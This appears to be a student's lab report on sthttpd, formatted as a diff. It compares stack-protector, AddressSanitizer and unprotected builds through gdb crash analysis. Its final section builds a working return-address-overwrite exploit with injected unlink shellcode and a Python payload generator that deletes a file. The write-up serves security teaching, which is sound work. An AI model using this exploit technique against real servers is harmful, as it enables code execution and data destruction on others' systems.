@@ -1,0 +1,270 @@
+1. sthttpd-2.27.0.tar.gz is copied onto linuxsrv07.seas.ucla.edu. On linuxsrv07, PATH is set using export PATH=/usr/local/cs/bin:$PATH. which gcc outputs "/usr/local/cs/bin/gcc" as intended. 
+
+2. sthttpd-2.27.0.tar.gz is unzipped using tar -xvzf. 
+   src/thttpd.c is edited according to the instructions on http://web.cs.ucla.edu/classes/spring17/cs33/lab/smashinglab.html
+   sthttpd is configured using ./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+   
+   then, using the shell script shown below, 3 versions of thttpd executables are compiled:
+   #!/bin/bash
+
+   make clean
+   make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+   mv src/thttpd src/thttpd-sp
+
+   make clean
+   make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+   mv src/thttpd src/thttpd-as
+
+   make clean
+   make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+   mv src/thttpd src/thttpd-no
+   
+   All of them are compiled. 
+
+3/4. A foo.txt containing a single line of text "AAAAAAAAA" is created in the sthttpd directory. 
+   Each of the executables created is run using src/thttpd-xx -p 12601 -D. The terminal hangs. 
+   A new terminal tab is opened and logged onto linuxsrv07. 
+   curl http://localhost:12601/foo.txt displays "AAAAAAAAA", indicating that the server is functioning properly. 
+
+
+5. To make SP crash:
+   110 'G's are written to config.txt. Run the executable in gdb using gdb src/thttpd-sp and then (gdb)run -p 12601 -C config.txt, produces:
+   /w/home.07/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp: unknown config option 'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGG...''
+   [Inferior 1 (process 3998) exited with code 01]
+
+   However, this is not the desired form of crashing, since no warnings of stack overflow are produced. 
+
+   Referring the thttpd documentation (http://acme.com/software/thttpd/thttpd_man.html), the following is written to config.txt:
+   user=GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+
+   Rerun using gdb, produces:
+   *** stack smashing detected ***: /w/home.07/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp terminated
+   ======= Backtrace: =========
+   /lib64/libc.so.6(__fortify_fail+0x37)[0x7ffff76ec047]
+   /lib64/libc.so.6(__fortify_fail+0x0)[0x7ffff76ec010]
+   /w/home.07/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp[0x405056]
+   /w/home.07/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp[0x40537f]
+   /w/home.07/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp[0x403876]
+   /lib64/libc.so.6(__libc_start_main+0xf5)[0x7ffff75feb35]
+   /w/home.07/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp[0x40441b]
+   ======= Memory map: ========
+   (Memory map)
+   Program received signal SIGABRT, Aborted.
+   0x00007ffff76121d7 in raise () from /lib64/libc.so.6
+   
+   Using (gdb) backtrace produces:
+   #0  0x00007ffff76121d7 in raise () from /lib64/libc.so.6
+   #1  0x00007ffff76138c8 in abort () from /lib64/libc.so.6
+   #2  0x00007ffff7651f07 in __libc_message () from /lib64/libc.so.6
+   #3  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+   #4  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+   #5  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
+   #6  0x000000000040537f in parse_args (argc=5, argv=0x7fffffffe1c8) at thttpd.c:893
+   #7  0x0000000000403876 in main (argc=<optimized out>, argv=<optimized out>) at thttpd.c:380
+   
+   Apparently some operations in the 1190th line of thttpd.c leads to a "stack check fail". 
+   A breakpoint is set at that position using (gdb) break thttpd.c:1190. The assembly code is displayed using (gdb) set disassemble-next-line on.
+
+   Rerun. The program arrives at the break point. Using stepi 3 times and the following assembly code is observed:
+
+   0x0000000000404f23 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+   0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+   0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00	jne    0x405051 <read_config+1521>
+=> 0x0000000000405051 <read_config+1521>:	e8 5a d4 ff ff	callq  0x4024b0 <__stack_chk_fail@plt>
+   
+   The assembly code compares the value at %fs:0x28 to a value on the stack (0x68(%rsp)), which is the canary value according to the documentation. 
+   If they are not equal, the canary value on the stack has corrupted and the program jumps to the stack smashing handling function __stack_chk_fail. 
+
+
+6. To make AS crash: 
+   110 'G's (as in the first attempt to crash the SP variant) are written to config.txt. Run the executable in gdb using gdb src/thttpd-as and then (gdb)run -p 12601 -C config.txt, produces:
+   
+   ==33283==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd94 at pc 0x00000043aec9 bp 0x7fffffffccf0 sp 0x7fffffffc4a0
+   READ of size 111 at 0x7fffffffcd94 thread T0
+    #0 0x43aec8 in __interceptor_strchr ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+    #1 0x4e0b50 in read_config /u/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:1018
+    #2 0x4e164e in parse_args /u/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:893
+    #3 0x408297 in main /u/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:380
+    #4 0x7ffff6cc6b34 in __libc_start_main (/lib64/libc.so.6+0x21b34)
+    #5 0x4093f9  (/w/home.07/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd-as+0x4093f9)
+
+   Address 0x7fffffffcd94 is located in stack of thread T0 at offset 132 in frame
+    #0 0x4e0a9f in read_config /u/be/ugrad/runjia/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:1000
+
+   This frame has 1 object(s):
+    [32, 132) 'line' <== Memory access at offset 132 overflows this variable
+   
+   This time the program crashes at a different location: thttpd.c:1018.
+   A break point is set at that location using (gdb) break thttpd.c:1018.
+   Rerun, with (gdb) set-disassemble-next-line on, the following is produced:
+
+   0x00000000004e0b43 <read_config+179>:	48 8b 3c 24	mov    (%rsp),%rdi
+   0x00000000004e0b47 <read_config+183>:	be 23 00 00 00	mov    $0x23,%esi
+=> 0x00000000004e0b4c <read_config+188>:	e8 2f a5 f5 ff	callq  0x43b080 <__interceptor_strchr(char const*, int)   
+   The assembly code calls the __interceptor_strchr function which handles the stack buffer overflow, causing the program to crash. 
+   According to the documentation of AddressSanitizer, this function checks whether the program 
+   attempts to access the stack redzone by examining the values of their corresponding shadow bytes (elsewhere in shadow memory).
+
+
+7. To make NO crash:
+   The config.txts used in steps 5 and 6 are recycled. Neither makes the program crash. 
+   The following text are written to config.txt:
+   user=GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG 
+   port=GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+   Run the executable in gdb using gdb src/thttpd-no and then (gdb) run -p 12601 -C config.txt, produces:
+
+   Program received signal SIGSEGV, Segmentation fault.
+   0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+   1190	    }
+   
+   (gdb) backtrace produces:
+   
+   #0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+   #1  0x4747474747474747 in ?? ()
+   #2  0x4747474747474747 in ?? ()
+   #3  0x4747474747474747 in ?? ()
+   #4  0x4747474747474747 in ?? ()
+   #5  0x4747474747474747 in ?? ()
+   #6  0x4747474747474747 in ?? ()
+   #7  0x4747474747474747 in ?? ()
+   #8  0x4747474747474747 in ?? ()
+   #9  0x4747474747474747 in ?? ()
+   #10 0x4747474747474747 in ?? ()
+   #11 0x4747474747474747 in ?? ()
+   #12 0x4747474747474747 in ?? ()
+   #13 0x0000000000474747 in ?? ()
+   #14 0x0000000000000000 in ?? () 
+
+   The stack has been contaminated by the 'G's in config.txt, overwritting the original call stack content. 
+   A breakpoint is set at 1190th line of thttpd.c, using (gdb) break thttpd.c:1190. 
+   With (gdb) set disassemble-next-line on, rerun, the following is produced: 
+
+   0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000404d97 <read_config+1207>:	5b	pop    %rbx
+   0x0000000000404d98 <read_config+1208>:	5d	pop    %rbp
+   0x0000000000404d99 <read_config+1209>:	41 5c	pop    %r12
+   0x0000000000404d9b <read_config+1211>:	41 5d	pop    %r13
+   0x0000000000404d9d <read_config+1213>:	41 5e	pop    %r14
+=> 0x0000000000404d9f <read_config+1215>:	c3	retq
+ 
+   The program crashes immediately after trying to return from read_config because the return address stored on the stack is overwritten.
+   The program attempts to return to an invalid address, leading to segmentation fault.
+
+
+8. To create the assembly files, the following bash script is executed:
+   
+   #!/bin/bash
+
+   make clean
+   make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+   mv src/thttpd.o src/thttpd-sp.s
+
+   make clean
+   make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+   mv src/thttpd.o src/thttpd-as.s
+
+   make clean
+   make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+   mv src/thttpd.o src/thttpd-no.s
+
+   Comparison of the resulting assembly files:
+
+   For both SP and NO variants, no obvious stack protection mechanisms are observed in handle_read function.
+   According to the article (https://lwn.net/Articles/584225/), -fstack-protector-strong option protects all functions that 
+   "declares any type or length of local array, even those in structs or unions" 
+   by adding stack canaries after the functions' return pointers on the stack. 
+   Stack smashing attacks will change the values of canaries, thus they can be identified by examining the canaries. 
+   However, the source code of handle_read function does not declare any arrays, unions or structs. Therefore it is not protected.
+
+   For the AS variant, a great number of operations in the form below are observed:
+   
+   shrq    $3, %rax
+   cmpb    $0, 2147450880(%rax)
+   jne     .L1189
+   ... 
+   
+.L1189:
+   movl    $httpd_err400form, %edi
+   call    __asan_report_load8 
+
+   According to the documentation (https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf), 
+   every time when memory access is instrumented, AddressSanitizer checks if the corresponding shadow byte 
+   (at memory location addr>>3 + offset) is zero. If it is not zero, it can be inferred that the program 
+   attempts to access out-of-bound memory (the poisoned redzone), and a crash is instrumented. This is exactly shown in the assembly code above. 
+
+
+9. The vulnerable buffer in read_config is char line[100]. To find its location, thttpd-no is run under gdb. 
+   A breakpoint is set at the line while ( fgets( line, 1000, fp ) != (char*) 0 ). 
+   Using (gdb) p &line, the address of line is printed out: 0x7fffffffce80
+   
+   To find the location on the stack where the return address is stored for read_config, a breakpoint is set at the last line of read_config using:
+   (gdb) break thttpd.c:1190
+   Running the program and using stepi to reach the assembly line where read_config returns:
+   
+   => 0x0000000000404d9f <read_config+1215>:	c3	retq
+   
+   Using (gdb) info registers, now %rsp is 0x7fffffffcf18. There are 152 bytes between it and the address of line. To test this, the following is written to config.txt:
+   
+   user=GGGGGGG.....(147 'G's, making a total of 152 bytes)
+
+   Run thttpd-no under gdb produces segmentation fault, while the following config.txt
+
+   user=GGGGGGG.....(146 'G's, making a total of 151 bytes) 
+
+   does not produce any error message. 
+
+   Now, append the desired return address to a string of 152 bytes. It is expected that the return address stored on the stack will be modified.
+
+   Before that, the attack code is prepared. To delete a file, the unlink system call should be invoked. 
+   According to documentation (https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux), to use the unlink syscall:
+   the number $87 should be stored in %rax and the address of the path string should be stored in %rdi (for x86-64 systems). 
+   The path string is arbitrarily chosen to be put right after the 5 bytes "user=" in the attack string. Therefore, its address on the call stack is 0x7fffffffce85. 
+   The attack string now has 5 + 10 = 15 bytes. An additional byte of '\0' should be appended to delimit the string, making 16 bytes.  
+   The following attack code is prepared:
+
+   #include <unistd.h>
+
+   int main()
+   {
+       __asm__
+       (   
+           "movq $87, %rax\n\t"
+           "movq $0x7fffffffce85, %rdi\n\t"
+           "syscall"
+       );
+   }
+
+   It is compiled using gcc -O2 -fno-inline -fno-stack-protector -zexecstack and disassembled using objdump. The corresponding assembly code is:
+
+   4003d0:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax   
+   4003d7:	48 bf 85 ce ff ff ff 	movabs $0x7fffffffce85,%rdi
+   4003de:	7f 00 00 
+   4003e1:	0f 05                	syscall 
+   
+   Get the hexadecimal byte code (19 bytes). Convert to ascii characters and append to the attack string using a custom python script. 
+   It starts right after the path string, so its address is 0x00007fffffffce90. The little endian is 90ceffffff7f0000.
+   Now the attack string has 16 + 19 = 35 bytes. Append another 152 - 35 = 117 bytes. Finally, append the address of the byte code.
+   The attack string is organized using the following script:
+
+   #!/usr/bin/env python
+
+   text = "user="
+   text += "target.txt"
+   text += "\x00H\xc7\xc0W\x00\x00\x00H\xbf\x85\xce\xff\xff\xff\x7f\x00\x00\x0f\x05"
+   text += "G" * 117
+   text += "\x90\xce\xff\xff\xff\x7f\x00\x00"
+
+   f = open("config.txt", "w")
+   f.write(text)
+   
+   Run thttpd-no under gdb. The following output is produced:
+
+   Program received signal SIGSEGV, Segmentation fault.
+   0x00007fffffffcea3 in ?? ()
+=> 0x00007fffffffcea3:	47	rex.RXB
+   
+   Quit gdb, and target.txt is already removed. Success.
+
+
+ 
